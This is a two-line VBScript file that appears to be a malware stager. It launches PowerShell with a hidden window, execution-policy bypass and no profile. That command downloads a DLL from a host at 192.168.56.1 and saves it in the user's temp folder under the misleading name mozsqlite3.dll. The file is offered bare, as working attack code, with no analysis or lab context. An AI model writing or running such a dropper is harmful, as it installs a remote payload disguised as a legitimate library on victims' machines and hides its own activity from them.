Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -w hidden -exec bypass -nop -noexit -c iwr -Uri http://192.168.56.1:8000/dll/byol.dll -OutFile $env:temp\mozsqlite3.dll"